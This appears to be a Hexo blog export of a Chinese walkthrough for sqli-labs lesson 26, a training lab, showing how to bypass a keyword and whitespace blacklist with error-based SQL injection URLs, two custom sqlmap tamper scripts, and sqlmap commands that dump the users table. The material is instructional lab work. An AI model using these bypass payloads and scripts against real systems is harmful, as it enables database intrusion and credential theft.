lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.NORMAL\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    >>> tamper('count(*)')\n    'count(1)'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        retVal = re.sub(r\"(?i)count\\(\\*\\)\", r\"count(1)\", payload)\n\n    return retVal\n```\n\n\n\n我这里重启了虚拟机ip地址变了,不过不影响实验结果。\n\n`python sqlmap.py -u \"http://192.168.75.133/sql/Less-26/?id=1\" --threads 10 --technique E --dbms mysql --tamper \"andor.py,space0A.py,count.py\" -D security -T users  --columns --dump --fresh-queries --flush-session`\n\n![009](/img/sql/Lesson-26/009.png)\n\n![010](/img/sql/Lesson-26/010.png)\n\n\n\n\n\n","source":"_posts/sqli-labs-lession-26-GET基于错误-你的空格和注释归我所有.md","raw":"---\ntitle: sqli-labs lession 26 GET基于错误-你的空格和注释归我所有\ndate: 2018-10-05 16:24:20\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession 26 GET基于错误-你的空格和注释归我所有\n\n---\n\n\n\n## 登录界面\n\n![001](/img/sql/Lesson-26/001.png)\n\n## 分析\n\n![002](/img/sql/Lesson-26/002.png)\n\n```\nfunction blacklist($id)\n{\n\t$id= preg_replace('/or/i',\"\", $id);\t\t\t//strip out OR (non case sensitive)\n\t$id= preg_replace('/and/i',\"\", $id);\t\t//Strip out AND (non case sensitive)\n\t$id= preg_replace('/[\\/\\*]/',\"\", $id);\t\t//strip out /*\n\t$id= preg_replace('/[--]/',\"\", $id);\t\t//Strip out --\n\t$id= preg_replace('/[#]/',\"\", $id);\t\t\t//Strip out #\n\t$id= preg_replace('/[\\s]/',\"\", $id);\t\t//Strip out spaces\n\t$id= preg_replace('/[\\/\\\\\\\\]/',\"\", $id);\t\t//Strip out slashes\n\treturn $id;\n}\n```\n\n过滤了 or and / * -- # 空格 \\\n\nor and还可以用上一课的方法\n\n### 绕过空格\n\n1. /**/ \n\n被本课的/*过滤\n\n2. `/**_**/`\n\n被本课的/*过滤\n\n3. #加一个换行符`%23%0A`和`-- `加一个换行符`--%0A`\n\n分别被本课的#过滤和--过滤\n\n4. 空白符替换\n\n这里要注意下,我用的Phpstudy搭建的环境,有的成功绕过,有的不行。\n\n%09 TAB键（水平） \n\n%0A 新建一行\n\n%0C 新的一页\n\n%0D return功能\n\n%0B TAB键（垂直） （php-5.2.17,5.3.29成功）\n\n%A0 空格 （php-5.2.17成功）\n\n5. 用()绕过,意思就是不使用任何空格\n\n括号可以用来包围子查询，任何计算结果的语句都可以使用`()`包围\n\n## 手注\n\n知道上述信息就可做了。如果要使用`%0B`做的话切换版本为php-5.2.17或5.3.29。用()绕过做这几个都行。\n\n我下面用phpStudy切换版本为php-5.4.45做。\n\n### 获取数据库名\n\n`http://192.168.75.132/sql/Less-26/?id=1'%26%26extractvalue(null,concat(0x7e,database(),0x7e))%7c%7c'1`\n\n![003](/img/sql/Lesson-26/003.png)\n\n### 获取表名\n\n`http://192.168.75.132/sql/Less-26/?id=1'%26%26extractvalue(null,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security')),0x7e))%7c%7c'1`\n\n![004](/img/sql/Lesson-26/004.png)\n\n### 获取列名\n\n`http://192.168.75.132/sql/Less-26/?id=1'%26%26extractvalue(null,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name='users')),0x7e))%7c%7c'1`\n\n![005](/img/sql/Lesson-26/005.png)\n\n### 获取字段值\n\n原谅我数据库学的不好,暂时只想到了按id找。\n\n`http://192.168.75.132/sql/Less-26/?id=1'%26%26extractvalue(null,concat(0x7e,(select(concat(username,'~',passwoorrd))from(security.users)where(id=1)),0x7e))%7c%7c'1`\n\n![006](/img/sql/Lesson-26/006.png)\n\n## SQLMAP\n\nsqlmap跑的话要切换php-5.2.17的版本\n\n### 修改脚本\n\nspace2plus.py：空格替换为加号\n\n在sqlmap的tamper目录下新建space0A.py文件,把space2plus.py脚本中内容复制过来,+改成`%A0`。\n\n```\n#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n    pass\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces space character (' ') with plus ('%A0')\n\n    Notes:\n        * Is this any useful? The plus get's url-encoded by sqlmap engine invalidating the query afterwards\n        * This tamper script works against all databases\n\n    >>> tamper('SELECT id FROM users')\n    'SELECT%A0id%A0FROM%A0users'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        retVal = \"\"\n        quote, doublequote, firstspace = False, False, False\n\n        for i in xrange(len(payload)):\n            if not firstspace:\n                if payload[i].isspace():\n                    firstspace = True\n                    retVal += \"%A0\"\n                    continue\n\n            elif payload[i] == '\\'':\n                quote = not quote\n\n            elif payload[i] == '\"':\n                doublequote = not doublequote\n\n            elif payload[i] == \" \" and not doublequote and not quote:\n                retVal += \"%A0\"\n                continue\n\n            retVal += payload[i]\n\n    return retVal\n```\n\n### 运行\n\n结合上次双写绕过and和or的andor.py脚本跑一下。\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-26/?id=1\" --threads 10 --technique E --dbms mysql --tamper \"space0A.py,andor.py\" --fresh-queries --flush-session`\n\n```\n--dbsm msql:指定后端数据库为mysql\n--technique E:指定注入方式为报错注入\n--threads 10:指定并发线程数为10\n--tamper space0A.py,andor.py\n\tandor.py:payload中的and用anandd or用oorr替代\n\tspace0A.py:空格用%A0替代\n--fresh-queries:发起新请求 \n--flush-session：刷新session\n```\n\n![007](/img/sql/Lesson-26/007.png)\n\n![008](/img/sql/Lesson-26/008.png)\n\n`python sqlmap.py -u \"http://192.168.75.133/sql/Less-26/?id=1\" --threads 10 --technique E --dbms mysql --tamper \"andor.py,space0A.py\" -D security --tables  --fresh-queries --flush-session`\n\n![008_1](/img/sql/Lesson-26/008_1.png)\n\n![008_2](/img/sql/Lesson-26/008_2.png)\n\n跑字段的时候出现了问题,拿不到数据。原来SQLMAP的payload中使用了`count(*)`包括了`*`，但是`*`被过滤了。自然得不出结果。\n\n![008_3](/img/sql/Lesson-26/008_3.png)\n\n\n\n通过查询资料可以发现`count(*)`和`count(常量)`是等价的,添加一个把`count(*)`替换成`count(1)`的脚本,命名为`count.py`\n\n```\n#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.NORMAL\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    >>> tamper('count(*)')\n    'count(1)'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        retVal = re.sub(r\"(?i)count\\(\\*\\)\", r\"count(1)\", payload)\n\n    return retVal\n```\n\n\n\n我这里重启了虚拟机ip地址变了,不过不影响实验结果。\n\n`python sqlmap.py -u \"http://192.168.75.133/sql/Less-26/?id=1\" --threads 10 --technique E --dbms mysql --tamper \"andor.py,space0A.py,count.py\" -D security -T users  --columns --dump --fresh-queries --flush-session`\n\n![009](/img/sql/Lesson-26/009.png)\n\n![010](/img/sql/Lesson-26/010.png)\n\n\n\n\n\n","slug":"sqli-labs-lession-26-GET基于错误-你的空格和注释归我所有","published":1,"updated":"2019-06-19T17:23:13.389Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istdf00374dsb1srmofep","content":"<h1 id=\"sqli-labs-lession-26-GET基于错误-你的空格和注释归我所有\"><a href=\"#sqli-labs-lession-26-GET基于错误-你的空格和注释归我所有\" class=\"headerlink\" title=\"sqli-labs lession 26 GET基于错误-你的空格和注释归我所有\"></a>sqli-labs lession 26 GET基于错误-你的空格和注释归我所有</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-26/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p><img src=\"/img/sql/Lesson-26/002.png\" alt=\"002\"></p>\n<figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function blacklist(<span class=\"variable\">$id</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/or/i'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t\t<span class=\"regexp\">//strip</span> out OR (non <span class=\"keyword\">case</span> sensitive)</span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/and/i'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t<span class=\"regexp\">//</span>Strip out AND (non <span class=\"keyword\">case</span> sensitive)</span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/[\\/\\*]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t<span class=\"regexp\">//strip</span> out /*</span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/[--]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t<span class=\"regexp\">//</span>Strip out --</span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/[#]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t\t<span class=\"regexp\">//</span>Strip out <span class=\"comment\">#</span></span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/[\\s]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t<span class=\"regexp\">//</span>Strip out spaces</span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/[\\/\\\\\\\\]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t<span class=\"regexp\">//</span>Strip out slashes</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"variable\">$id</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>过滤了 or and / * – # 空格 \\</p>\n<p>or and还可以用上一课的方法</p>\n<h3 id=\"绕过空格\"><a href=\"#绕过空格\" class=\"headerlink\" title=\"绕过空格\"></a>绕过空格</h3><ol>\n<li>/**/ </li>\n</ol>\n<p>被本课的/*过滤</p>\n<ol start=\"2\">\n<li><code>/**_**/</code></li>\n</ol>\n<p>被本课的/*过滤</p>\n<ol start=\"3\">\n<li>#加一个换行符<code>%23%0A</code>和<code>--</code>加一个换行符<code>--%0A</code></li>\n</ol>\n<p>分别被本课的#过滤和–过滤</p>\n<ol start=\"4\">\n<li>空白符替换</li>\n</ol>\n<p>这里要注意下,我用的Phpstudy搭建的环境,有的成功绕过,有的不行。</p>\n<p>%09 TAB键（水平） </p>\n<p>%0A 新建一行</p>\n<p>%0C 新的一页</p>\n<p>%0D return功能</p>\n<p>%0B TAB键（垂直） （php-5.2.17,5.3.29成功）</p>\n<p>%A0 空格 （php-5.2.17成功）</p>\n<ol start=\"5\">\n<li>用()绕过,意思就是不使用任何空格</li>\n</ol>\n<p>括号可以用来包围子查询，任何计算结果的语句都可以使用<code>()</code>包围</p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><p>知道上述信息就可做了。如果要使用<code>%0B</code>做的话切换版本为php-5.2.17或5.3.29。用()绕过做这几个都行。</p>\n<p>我下面用phpStudy切换版本为php-5.4.45做。</p>\n<h3 id=\"获取数据库名\"><a href=\"#获取数据库名\" class=\"headerlink\" title=\"获取数据库名\"></a>获取数据库名</h3><p><code>http://192.168.75.132/sql/Less-26/?id=1&#39;%26%26extractvalue(null,concat(0x7e,database(),0x7e))%7c%7c&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-26/003.png\" alt=\"003\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p><code>http://192.168.75.132/sql/Less-26/?id=1&#39;%26%26extractvalue(null,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;)),0x7e))%7c%7c&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-26/004.png\" alt=\"004\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><code>http://192.168.75.132/sql/Less-26/?id=1&#39;%26%26extractvalue(null,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=&#39;users&#39;)),0x7e))%7c%7c&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-26/005.png\" alt=\"005\"></p>\n<h3 id=\"获取字段值\"><a href=\"#获取字段值\" class=\"headerlink\" title=\"获取字段值\"></a>获取字段值</h3><p>原谅我数据库学的不好,暂时只想到了按id找。</p>\n<p><code>http://192.168.75.132/sql/Less-26/?id=1&#39;%26%26extractvalue(null,concat(0x7e,(select(concat(username,&#39;~&#39;,passwoorrd))from(security.users)where(id=1)),0x7e))%7c%7c&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-26/006.png\" alt=\"006\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>sqlmap跑的话要切换php-5.2.17的版本</p>\n<h3 id=\"修改脚本\"><a href=\"#修改脚本\" class=\"headerlink\" title=\"修改脚本\"></a>修改脚本</h3><p>space2plus.py：空格替换为加号</p>\n<p>在sqlmap的tamper目录下新建space0A.py文件,把space2plus.py脚本中内容复制过来,+改成<code>%A0</code>。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)</span></span><br><span class=\"line\"><span class=\"string\">See the file 'LICENSE' for copying permission</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> lib.core.enums <span class=\"keyword\">import</span> PRIORITY</span><br><span class=\"line\"></span><br><span class=\"line\">__priority__ = PRIORITY.LOW</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dependencies</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">tamper</span><span class=\"params\">(payload, **kwargs)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">    Replaces space character (' ') with plus ('%A0')</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Notes:</span></span><br><span class=\"line\"><span class=\"string\">        * Is this any useful? The plus get's url-encoded by sqlmap engine invalidating the query afterwards</span></span><br><span class=\"line\"><span class=\"string\">        * This tamper script works against all databases</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    &gt;&gt;&gt; tamper('SELECT id FROM users')</span></span><br><span class=\"line\"><span class=\"string\">    'SELECT%A0id%A0FROM%A0users'</span></span><br><span class=\"line\"><span class=\"string\">    \"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">    retVal = payload</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> payload:</span><br><span class=\"line\">        retVal = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        quote, doublequote, firstspace = <span class=\"literal\">False</span>, <span class=\"literal\">False</span>, <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(len(payload)):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> firstspace:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> payload[i].isspace():</span><br><span class=\"line\">                    firstspace = <span class=\"literal\">True</span></span><br><span class=\"line\">                    retVal += <span class=\"string\">\"%A0\"</span></span><br><span class=\"line\">                    <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">elif</span> payload[i] == <span class=\"string\">'\\''</span>:</span><br><span class=\"line\">                quote = <span class=\"keyword\">not</span> quote</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">elif</span> payload[i] == <span class=\"string\">'\"'</span>:</span><br><span class=\"line\">                doublequote = <span class=\"keyword\">not</span> doublequote</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">elif</span> payload[i] == <span class=\"string\">\" \"</span> <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> doublequote <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> quote:</span><br><span class=\"line\">                retVal += <span class=\"string\">\"%A0\"</span></span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">            retVal += payload[i]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> retVal</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h3><p>结合上次双写绕过and和or的andor.py脚本跑一下。</p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-26/?id=1&quot; --threads 10 --technique E --dbms mysql --tamper &quot;space0A.py,andor.py&quot; --fresh-queries --flush-session</code></p>\n<figure class=\"highlight ada\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--dbsm msql:指定后端数据库为mysql</span></span><br><span class=\"line\"><span class=\"comment\">--technique E:指定注入方式为报错注入</span></span><br><span class=\"line\"><span class=\"comment\">--threads 10:指定并发线程数为10</span></span><br><span class=\"line\"><span class=\"comment\">--tamper space0A.py,andor.py</span></span><br><span class=\"line\">\tandor.py:payload中的<span class=\"keyword\">and</span>用anandd <span class=\"keyword\">or</span>用oorr替代</span><br><span class=\"line\">\tspace0A.py:空格用%A0替代</span><br><span class=\"line\"><span class=\"comment\">--fresh-queries:发起新请求 </span></span><br><span class=\"line\"><span class=\"comment\">--flush-session：刷新session</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/sql/Lesson-26/007.png\" alt=\"007\"></p>\n<p><img src=\"/img/sql/Lesson-26/008.png\" alt=\"008\"></p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.133/sql/Less-26/?id=1&quot; --threads 10 --technique E --dbms mysql --tamper &quot;andor.py,space0A.py&quot; -D security --tables  --fresh-queries --flush-session</code></p>\n<p><img src=\"/img/sql/Lesson-26/008_1.png\" alt=\"008_1\"></p>\n<p><img src=\"/img/sql/Lesson-26/008_2.png\" alt=\"008_2\"></p>\n<p>跑字段的时候出现了问题,拿不到数据。原来SQLMAP的payload中使用了<code>count(*)</code>包括了<code>*</code>，但是<code>*</code>被过滤了。自然得不出结果。</p>\n<p><img src=\"/img/sql/Lesson-26/008_3.png\" alt=\"008_3\"></p>\n<p>通过查询资料可以发现<code>count(*)</code>和<code>count(常量)</code>是等价的,添加一个把<code>count(*)</code>替换成<code>count(1)</code>的脚本,命名为<code>count.py</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)</span></span><br><span class=\"line\"><span class=\"string\">See the file 'LICENSE' for copying permission</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> lib.core.enums <span class=\"keyword\">import</span> PRIORITY</span><br><span class=\"line\"></span><br><span class=\"line\">__priority__ = PRIORITY.NORMAL</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">tamper</span><span class=\"params\">(payload, **kwargs)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">    &gt;&gt;&gt; tamper('count(*)')</span></span><br><span class=\"line\"><span class=\"string\">    'count(1)'</span></span><br><span class=\"line\"><span class=\"string\">    \"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">    retVal = payload</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> payload:</span><br><span class=\"line\">        retVal = re.sub(<span class=\"string\">r\"(?i)count\\(\\*\\)\"</span>, <span class=\"string\">r\"count(1)\"</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> retVal</span><br></pre></td></tr></table></figure>\n\n<p>我这里重启了虚拟机ip地址变了,不过不影响实验结果。</p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.133/sql/Less-26/?id=1&quot; --threads 10 --technique E --dbms mysql --tamper &quot;andor.py,space0A.py,count.py&quot; -D security -T users  --columns --dump --fresh-queries --flush-session</code></p>\n<p><img src=\"/img/sql/Lesson-26/009.png\" alt=\"009\"></p>\n<p><img src=\"/img/sql/Lesson-26/010.png\" alt=\"010\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-26-GET基于错误-你的空格和注释归我所有\"><a href=\"#sqli-labs-lession-26-GET基于错误-你的空格和注释归我所有\" class=\"headerlink\" title=\"sqli-labs lession 26 GET基于错误-你的空格和注释归我所有\"></a>sqli-labs lession 26 GET基于错误-你的空格和注释归我所有</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-26/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p><img src=\"/img/sql/Lesson-26/002.png\" alt=\"002\"></p>\n<figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function blacklist(<span class=\"variable\">$id</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/or/i'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t\t<span class=\"regexp\">//strip</span> out OR (non <span class=\"keyword\">case</span> sensitive)</span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/and/i'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t<span class=\"regexp\">//</span>Strip out AND (non <span class=\"keyword\">case</span> sensitive)</span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/[\\/\\*]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t<span class=\"regexp\">//strip</span> out /*</span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/[--]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t<span class=\"regexp\">//</span>Strip out --</span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/[#]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t\t<span class=\"regexp\">//</span>Strip out <span class=\"comment\">#</span></span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/[\\s]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t<span class=\"regexp\">//</span>Strip out spaces</span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/[\\/\\\\\\\\]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t<span class=\"regexp\">//</span>Strip out slashes</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"variable\">$id</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>过滤了 or and / * – # 空格 \\</p>\n<p>or and还可以用上一课的方法</p>\n<h3 id=\"绕过空格\"><a href=\"#绕过空格\" class=\"headerlink\" title=\"绕过空格\"></a>绕过空格</h3><ol>\n<li>/**/ </li>\n</ol>\n<p>被本课的/*过滤</p>\n<ol start=\"2\">\n<li><code>/**_**/</code></li>\n</ol>\n<p>被本课的/*过滤</p>\n<ol start=\"3\">\n<li>#加一个换行符<code>%23%0A</code>和<code>--</code>加一个换行符<code>--%0A</code></li>\n</ol>\n<p>分别被本课的#过滤和–过滤</p>\n<ol start=\"4\">\n<li>空白符替换</li>\n</ol>\n<p>这里要注意下,我用的Phpstudy搭建的环境,有的成功绕过,有的不行。</p>\n<p>%09 TAB键（水平） </p>\n<p>%0A 新建一行</p>\n<p>%0C 新的一页</p>\n<p>%0D return功能</p>\n<p>%0B TAB键（垂直） （php-5.2.17,5.3.29成功）</p>\n<p>%A0 空格 （php-5.2.17成功）</p>\n<ol start=\"5\">\n<li>用()绕过,意思就是不使用任何空格</li>\n</ol>\n<p>括号可以用来包围子查询，任何计算结果的语句都可以使用<code>()</code>包围</p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><p>知道上述信息就可做了。如果要使用<code>%0B</code>做的话切换版本为php-5.2.17或5.3.29。用()绕过做这几个都行。</p>\n<p>我下面用phpStudy切换版本为php-5.4.45做。</p>\n<h3 id=\"获取数据库名\"><a href=\"#获取数据库名\" class=\"headerlink\" title=\"获取数据库名\"></a>获取数据库名</h3><p><code>http://192.168.75.132/sql/Less-26/?id=1&#39;%26%26extractvalue(null,concat(0x7e,database(),0x7e))%7c%7c&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-26/003.png\" alt=\"003\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" 